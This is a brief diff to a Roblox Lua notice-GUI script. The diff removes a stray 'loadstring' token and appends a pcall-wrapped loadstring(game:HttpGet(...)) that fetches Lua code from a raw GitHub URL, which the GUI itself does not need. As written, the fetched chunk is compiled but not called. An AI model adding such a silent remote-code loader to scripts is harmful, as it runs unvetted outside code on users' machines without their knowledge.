@@ -1,4 +1,3 @@
-loadstring
 
 local Notice = Instance.new("ScreenGui")
 local Hold = Instance.new("Frame")
@@ -189,5 +188,11 @@ local function POLZ_fake_script() -- Hold.drag
 	end)
 	
 	runService.Heartbeat:Connect(Update)
+
 end
 coroutine.wrap(POLZ_fake_script)()
+
+
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/treeofplant/lua/main/lua3.lua"))
+end)
